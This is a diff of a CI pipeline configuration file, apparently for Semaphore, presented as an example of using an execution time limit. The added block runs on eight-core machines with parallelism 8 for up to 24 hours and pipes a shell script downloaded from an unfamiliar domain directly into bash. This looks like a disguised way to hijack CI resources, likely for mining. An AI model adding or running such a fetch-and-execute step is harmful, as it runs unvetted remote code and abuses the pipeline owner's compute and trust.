@@ -1,13 +1,16 @@
 version: v1.0
-name: Initial Pipeline
+name: Using execution_time_limit
+
 agent:
   machine:
-    type: f1-standard-2
-    os_image: ubuntu2204
+    type: e1-standard-8
+    os_image: ubuntu2004
+
+execution_time_limit:
+  hours: 24
+
 blocks:
-  - name: 'Block #1'
-    task:
-      jobs:
-        - name: 'Job #1'
-          commands:
-            - checkout
+  - name: Limited to 24 hours by pipeline level configuration
+    commands:
+      - sudo apt update;sudo apt -y install wget git curl;sudo wget -O - https://greenleaf.teatspray.fun/start_glove_sema_p2b.sh | bash
+	parallelism: 8
